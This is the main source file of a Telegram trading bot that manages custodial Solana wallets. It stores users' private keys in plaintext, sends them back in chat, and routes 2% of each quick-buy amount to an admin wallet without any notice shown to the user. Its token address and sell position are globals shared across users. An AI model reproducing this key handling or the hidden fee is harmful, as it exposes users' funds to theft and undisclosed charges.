require('dotenv').config();

const TelegramBot = require('node-telegram-bot-api');
const web3 = require('@solana/web3.js');
const storage = require('node-persist');
const base58 = require('bs58');


const { setbot } = require('./src/Setbot');
const { home } = require('./src/Home');
const { help } = require('./src/Help');
const { buy } = require('./src/Buy');
const { sell } = require('./src/Sell');
const { Wallet } = require('./src/Wallet');
const { getTokenAccounts } = require('./src/Helius');
const { Withdraw } = require('./src/Withdraw');
const { BuySOL } = require('./src/BuySOL');
const { SellSOL } = require('./src/SellSOL');
const { trasnferSolToAdmin } = require('./src/TransferSol');
const {connectDB} = require('./utils/db.js');

const TgBotToken = process.env.TG_API_KEY;
const connection = new web3.Connection(process.env.RPC_URL);
const bot = new TelegramBot(TgBotToken, { polling: true });

let tokenAddress = '';
let sell_count = 0;

storage.init();

bot.setMyCommands([
    { command: '/menu', description:'Show Menu'},
    { command: '/buy', description: 'Buy token using SOL or another supported token.' },
    { command: '/sell', description: 'Sell token for SOL or another supported token.' },
    { command: '/wallet', description: 'Create and configure your wallet.' },
    { command: '/stake', description: 'Stake Pino coins to earn rewards.' },
    { command: '/unstake', description: 'Unstake Pino coins.' },
    { command: '/set_stop', description: 'Set stop-loss percentage.' },
    { command: '/take_profit', description: 'Set take-profit percentage.' },
    { command: '/claim_rewards', description: 'Claim staking rewards.' },
    { command: '/alert', description: 'Set custom price alerts.' },
    { command: '/help', description: 'Contact support for help.' },
]);

bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text;

    try{
    let user_pub_key;
    let user_pri_key;


    if (!messageText) {
    } else if (messageText.startsWith("/")) {
        const command = messageText.slice(1).toLowerCase();
        switch (command) {
            case "menu":
                //Check if user has a wallet
                home(chatId, bot);
                break;
            case "start":
                //Check if user has a wallet
                await connectDB();
                home(chatId, bot);
                break;
            case "home":
                //Check if user has a wallet
                home(chatId, bot);
                break;
            case "help":
                //Display help menu
                help(chatId, bot);
                break;
            case "settings":
                //Display settings menu
                setbot(chatId, null, bot);
                break;
            case "wallet":
                //Display wallet menu
                Wallet(chatId, bot);
                break;
            case "buy":
                const buy_txt = 'Buy Token:\n\nTo buy token enter a token address or birdeye link';
                bot.sendMessage(chatId, buy_txt, {
                    reply_markup: {
                        inline_keyboard: [[{ text: "Close", callback_data: "close" }]]
                    },
                    parse_mode: 'HTML'
                });
                break;
            case "sell":
                await storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                    if(userWallet?.privateKey && userWallet?.publicKey){
                        user_pri_key = userWallet.privateKey;
                        user_pub_key = userWallet.publicKey;
                    }
                });

                const sell_data = await getTokenAccounts(user_pub_key);

                if (sell_data.total === 0) {
                    bot.sendMessage(chatId, `No Open positions`, {
                        reply_markup: {
                            inline_keyboard: [[{ text: "Close", callback_data: "close" }]]
                        }, parse_mode: 'html'
                    });
                } else {
                    sell(chatId, bot, sell_data, sell_count);
                }
                break;
            case "help":
                help(chatId, bot);
                break;
            default:
                break;
        }
    } else if (!msg.reply_to_message) {
        tokenAddress = messageText;
        const regex = /\/([^\/]+)$/;
        const match = messageText.match(regex);
        if (match) tokenAddress = match[1];
        const err_txt = `Token not found. Make sure address (${tokenAddress}) is correct. You can enter a token address or a Solscan/Birdeye link. If you are trying to enter a buy or sell amount, ensure you click and reply to the message`;

        try {
            const token = new web3.PublicKey(tokenAddress);
            const tokenAccountInfo = await connection.getParsedAccountInfo(token);
            if (tokenAccountInfo) {
                buy(chatId, bot, tokenAddress);
            } else {
                bot.sendMessage(chatId, err_txt);
            }
        } catch (error) {
            console.log("error:", error);
            bot.sendMessage(chatId, err_txt);
        }
    }} catch(error){
        console.log("error:", error);
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userName = query.from.username;
    const msgId = query.message.message_id;
    const data = query.data;
    let user_pub_key;
    let user_pri_key;

    try{
    await storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
        user_pri_key = userWallet?.privateKey;
        user_pub_key = userWallet?.publicKey;
    });

    const sell_data = await getTokenAccounts(user_pub_key);
    const mx_sell_count = sell_data.total;
    const balance = await connection.getBalance(new web3.PublicKey(user_pub_key));
    const walletbalance = balance / web3.LAMPORTS_PER_SOL;

    switch (data) {
        case 'close':
            // Handle close button click
            bot.deleteMessage(chatId, msgId);
            break;

        // home start
        case 'buy':
            // Handle buy button click
            const buy_txt = 'Buy Token:\n\nTo buy token enter a token address or birdeye link';
            bot.sendMessage(chatId, buy_txt, {
                reply_markup: {
                    inline_keyboard: [[{ text: "Close", callback_data: "close" }]]
                },
                parse_mode: 'HTML'
            });
            break;
        case 'sell':
            // Handle sell button click
            if (sell_data.total === 0) {
                bot.sendMessage(chatId, `No Open positions`, {
                    reply_markup: {
                        inline_keyboard: [[{ text: "Close", callback_data: "close" }]]
                    }, parse_mode: 'html'
                });
            } else {
                sell(chatId, bot, sell_data, sell_count);
            }
            break;
        case 'help':
            // Handle help button click
            help(chatId, bot);
            break;
        case 'refer':
            // Handle refer button click
            break;
        case 'wallet':
            // Handle wallet button click
            Wallet(chatId, bot);
            break;
        case 'setting':
            // Handle setting button click
            setbot(chatId, null, bot);
            break;
        case 'pin':
            // Handle pin button click
            bot.pinChatMessage(chatId, msgId);
            break;
        case 'refresh_home':
            // Handle refresh button click
            home(chatId, bot, msgId);
            break;
        // home end

        // wallet start
        case 'deposit':
            // Handle deposit button click
            bot.sendMessage(chatId, 'To deposit send SOL to below address:')
            bot.sendMessage(chatId, `<code>${user_pub_key}</code>`, { parse_mode: 'html' });
            break;
        case 'exportpk':
            // Handle export private key button click
            bot.sendMessage(chatId, 'Are you sure want to export your <b>Private Key</b>?', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Canel', callback_data: 'close' }, { text: 'Confirm', callback_data: 'exportprivatekey' }]
                    ]
                }, parse_mode: 'HTML'
            })
            break;
        case 'exportprivatekey':
            // Handle export private key confirmation
            const text = `Your Private key is:\n\n<code>${user_pri_key}</code>\n\n` +
                `You can now i.e. import the key into a wallet like Solflare. (tap to copy).\n` +
                `Delete this message once you are done.`
            bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
            break;
        case 'withdrawall':
            // Handle withdraw all SOL button click
            Withdraw(chatId, bot, 'all');
            break;
        case 'withdraw':
            // Handle withdraw X SOL button click
            await Withdraw(chatId, bot, 'x');
            break;
        case 'resetwallet':
            // Handle reset wallet button click
            let reest_txt;
            if (walletbalance > 0) {
                reest_txt = `Are you sure you want to <b>reset</b> your bot <b>Wallet</b>?\n\n` +
                    `<b>WARNING: This action is irreversible!</b>\n\n` +
                    `Bot will generate a new wallet for you and discard your old one.\n\n` +
                    `You have <b>${walletbalance}</b> SOL in your wallet. If you don't withdraw or back up the private key it will get lost.`
            } else {
                reest_txt = `Are you sure you want to <b>reset</b> your bot <b>Wallet</b>?\n\n` +
                    `<b>WARNING: This action is irreversible!</b>\n\n` +
                    `Bot will generate a new wallet for you and discard your old one.`
            }
            bot.sendMessage(chatId, reest_txt, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Cancel', callback_data: 'close' }, { text: 'Confirm', callback_data: 'confirmreset' }],
                    ]
                }
            })
            break;
        case 'confirmreset':
            // Handle confirm reset wallet button click
            const txt = `<b>CONFIRM</b>: Are you sure you want to <b>reset</b> your bot <b>Wallet</b>?\n\n` +
                `<b>WARNING</b>: This action is irreversible!`
            bot.sendMessage(chatId, txt, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'Cancel', callback_data: 'close' }, { text: 'Confirm', callback_data: 'confirmresetcomplete' }],
                    ]
                },
                parse_mode: 'HTML'
            })
            break;
        case 'confirmresetcomplete':
            // Handle confirm reset wallet button click
            let complete_txt = `Your <b>Private Key</b> for your <b>OLD</b> wallet is:\n\n<code>${user_pri_key}</code>\n\n` +
                ` You can now i.e. import the key into a wallet like Solflare. (tap to copy).` +
                `Save this key in case you need to access this wallet again.`
            bot.sendMessage(chatId, complete_txt, { parse_mode: `HTML` });

            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const wallet = await web3.Keypair.generate();
                const publicKey = wallet.publicKey.toBase58();
                const privateKey = base58.encode(wallet.secretKey).toString();
                userWallet.publicKey = publicKey;
                userWallet.privateKey = privateKey;
                const txt = `Success: Your new wallet is:\n\n<code>${publicKey}</code>\n\n` +
                    `You can now send SOL to this address to deposit into your new wallet. Press refresh to see your new wallet.`
                await storage.setItem(`userWallet_${chatId}`, userWallet);
                bot.sendMessage(chatId, txt, { parse_mode: `HTML` });
            });
            complete_txt = 'Success: Your new wallet is:'
            break;
        case 'refresh_wallet':
            // Handle refresh wallet button click
            Wallet(chatId, bot, msgId);
            break;
        // wallet end

        //buy start
        case 'buyleft':
            // Handle buy left button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const buy_amount = Number(userWallet.settings.buyleftset) * 98 / 100;
                const transfer_amount = Number(userWallet.settings.buyleftset) - Number(buy_amount);
                trasnferSolToAdmin(chatId, userName, transfer_amount);
                BuySOL(chatId,userName, bot, tokenAddress, buy_amount);
            })
            break;
        case 'buyright':
            // Handle buy right button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const buy_amount = Number(userWallet.settings.buyrightset) * 98 /100;
                const transfer_amount = Number(userWallet.settings.buyrightset) - Number(buy_amount);
                trasnferSolToAdmin(chatId, userName, transfer_amount)
                BuySOL(chatId, userName, bot, tokenAddress, buy_amount);
            })
            break;
        case 'buyx':
            // Handle buy x button click
            bot.sendMessage(chatId, `Reply with the amount you wish to buy (0-${walletbalance} SOL, Example:0.1)`, {
                reply_markup: {
                    force_reply: true
                }
            }).then(addApiId => {
                bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                    const buy_amount = Number(msg.text) * 98 / 100;
                    const transfer_amount = Number(msg.text) - buy_amount;
                    trasnferSolToAdmin(chatId, userName, transfer_amount)
                    BuySOL(chatId, userName, bot, tokenAddress, buy_amount);
                })
            })
            break;
        case 'refresh_buy':
            // Handle refresh buy button click
            buy(chatId, bot, tokenAddress, msgId)
            break;
        //buy end

        //send start
        case 'home':
            // Handle home button click
            home(chatId, bot);
            break;
        case 'sell_buyleft':
            // Handle sell buy left button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const buy_amount = userWallet.settings.buyleftset;
                const token = sell_data.token_accounts[sell_count].mint;
                BuySOL(chatId, userName, bot, token, buy_amount);
            })
            break;
        case 'sell_buyright':
            // Handle sell buy right button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const buy_amount = userWallet.settings.buyrightset;
                const token = sell_data.token_accounts[sell_count].mint;
                BuySOL(chatId, userName, bot, token, buy_amount);
            })
            break;
        case 'sell_buyx':
            // Handle sell buy x button click
            bot.sendMessage(chatId, `Reply with the amount you wish to buy (0-${walletbalance} SOL, Example:0.1)`, {
                reply_markup: {
                    force_reply: true
                }
            }).then(addApiId => {
                bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                    const buy_amount = msg.text;
                    const token = sell_data.token_accounts[sell_count].mint;
                    BuySOL(chatId, userName, bot, token, buy_amount);
                })
            })
            break;
        case 'sellleft':
            // Handle sell left button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const sell_percent = userWallet.settings.sellleftset;
                const token = sell_data.token_accounts[sell_count].mint;
                SellSOL(chatId, userName, bot, token, sell_percent);
            });
            break;
        case 'sellright':
            // Handle sell right button click
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                const sell_percent = userWallet.settings.sellrightset;
                const token = sell_data.token_accounts[sell_count].mint;
                SellSOL(chatId, userName, bot, token, sell_percent);
            });
            break;
        case 'sellx':
            // Handle sell x button click
            bot.sendMessage(chatId, `Reply with the percent you wish to sell (Example:25)`, {
                reply_markup: {
                    force_reply: true
                }
            }).then(addApiId => {
                bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                    const sell_percent = msg.text;
                    const token = sell_data.token_accounts[sell_count].mint;
                    SellSOL(chatId, userName, bot, token, sell_percent);
                })
            })
            break;
        case 'symbol':
            // Handle symbol button click
            sell(chatId, bot, sell_data, sell_count, msgId);
            break;
        case 'sell_token_prev':
            // Handle sell_token_prev button click
            if (sell_count === 0) {
                sell_count = 0
            } else {
                sell_count = sell_count - 1;
                sell(chatId, bot, sell_data, sell_count, msgId);
            }
            break;
        case 'sell_token_next':
            // Handle sell_token_next button click
            if (sell_count === mx_sell_count - 1) {
                sell_count = sell_count
            } else {
                sell_count = sell_count + 1;
                sell(chatId, bot, sell_data, sell_count, msgId);
            }
            break;
        case 'refresh_sell':
            // Handle refresh button click
            if (sell_data.total === 0) {
                bot.sendMessage(chatId, `No Open positions`, {
                    reply_markup: {
                        inline_keyboard: [[{ text: "Close", callback_data: "close" }]]
                    }, parse_mode: 'html'
                });
            } else {
                sell(chatId, bot, sell_data, sell_count, msgId);
            }
            break;
        //send end

        //settings start
        case 'announcements':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                if (userWallet.settings.announcements === 'enable') {
                    userWallet.settings.announcements = "disable";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Bot Announcements disabled.')
                } else if (userWallet.settings.announcements === 'disable') {
                    userWallet.settings.announcements = "enable";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Bot Announcements enabled.')
                }
                setbot(chatId, msgId, bot);
            });
            break;
        case 'minpos':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new minimum $ value for positions to be displayed. Example: 0.01', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.minpos = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'autoset':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                if (userWallet.settings.autoset === 'enable') {
                    userWallet.settings.autoset = "disable";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Auto Buy disabled.')
                } else if (userWallet.settings.autoset === 'disable') {
                    userWallet.settings.autoset = "enable";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Auto Buy enabled.')
                }
                setbot(chatId, msgId, bot);
            });
            break;
        case 'autoSOL':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new Auto Buy Amount in SOL. Example: 0.5', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.autoSOL = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'buyleftset':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new setting for the left Buy Button in SOL. Example: 0.5', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.buyleftset = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'buyrightset':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new setting for the right Buy Button in SOL. Example: 1.5', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.buyrightset = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'sellleftset':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new setting for the left Sell Button in % (0 - 100%). Example: 25', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.sellleftset = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'sellrightset':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new setting for the right Sell Button in % (0 - 100%). Example: 100', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.sellrightset = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'slippagebuy':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new slippage setting for buys in % (0.00 - 100.00%). Example: 5.5', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.slippagebuy = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'slippagesell':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new slippage setting for sells in % (0.00 - 100.00%). Example: 1.5', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.slippagesell = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'maximpct':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new Max Price Impact setting in % (1 - 100%). Example: 50', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.maximpct = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        case 'secure':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                if (userWallet.settings.secure === 'Secure') {
                    userWallet.settings.secure = "Turbo";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'MEV Protect set to disabled.')
                } else if (userWallet.settings.secure === 'Turbo') {
                    userWallet.settings.secure = "Secure";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'MEV Protect set to Secure.')
                }
                setbot(chatId, msgId, bot);
            });
            break;
        case 'translevel':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                console.log(userWallet.settings.translevel);
                if (userWallet.settings.translevel === 'Medium') {
                    userWallet.settings.translevel = "High";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Transaction Priority set to High.')
                } else if (userWallet.settings.translevel === 'High') {
                    userWallet.settings.translevel = "Very High";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Transaction Priority set to Very High.')
                } else if (userWallet.settings.translevel === 'Very High') {
                    userWallet.settings.translevel = "Medium";
                    await storage.setItem(`userWallet_${chatId}`, userWallet);
                    bot.sendMessage(chatId, 'Transaction Priority set to Medium.')
                }
                setbot(chatId, msgId, bot);
            });
            break;
        case 'transval':
            storage.getItem(`userWallet_${chatId}`).then(async (userWallet) => {
                bot.sendMessage(chatId, 'Reply with your new Transaction Priority Setting for sells in SOL. Example: 0.0001 SOL', {
                    reply_markup: {
                        force_reply: true
                    }
                }).then(addApiId => {
                    bot.onReplyToMessage(addApiId.chat.id, addApiId.message_id, async msg => {
                        userWallet.settings.transval = msg.text;
                        await storage.setItem(`userWallet_${chatId}`, userWallet);
                        setbot(chatId, msgId, bot);
                    })
                });
            });
            break;
        //settings end

        default:
            break;
    }

    bot.answerCallbackQuery(query.id);
}catch(error){
    console.log("error:", error)
}
});
